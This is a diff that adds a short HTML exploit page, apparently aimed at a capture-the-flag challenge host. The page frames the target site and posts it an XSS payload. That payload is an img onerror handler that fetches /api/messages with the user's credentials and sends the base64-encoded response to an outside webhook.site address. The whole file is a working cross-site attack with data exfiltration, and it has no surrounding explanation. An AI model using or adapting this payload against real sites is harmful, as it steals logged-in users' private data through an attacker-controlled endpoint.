@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  const app = document.createElement('iframe');
+  app.src = 'https://7fd91044-45d1-4c43-9260-453e7a5ce9a5.offsec.m0lecon.it/';
+  app.style.width = '100%';
+  app.style.height = '600px';
+  
+  app.onload = () => {
+    setTimeout(() => {
+      const previewFrame = app.contentDocument
+        .getElementById('preview-frame');
+      
+      previewFrame.contentWindow.postMessage({
+        html: `<img src=x onerror="
+          fetch('/api/messages', {credentials:'include'})
+            .then(r=>r.text())
+            .then(d=>fetch(' 	https://webhook.site/e1a822ee-3b01-4417-aa61-3ec13bd0413f?data='+btoa(d)))
+        ">`
+      }, '*');
+    }, 2000);
+  };
+  
+  document.body.appendChild(app);
+</script>
+</body>
+</html>
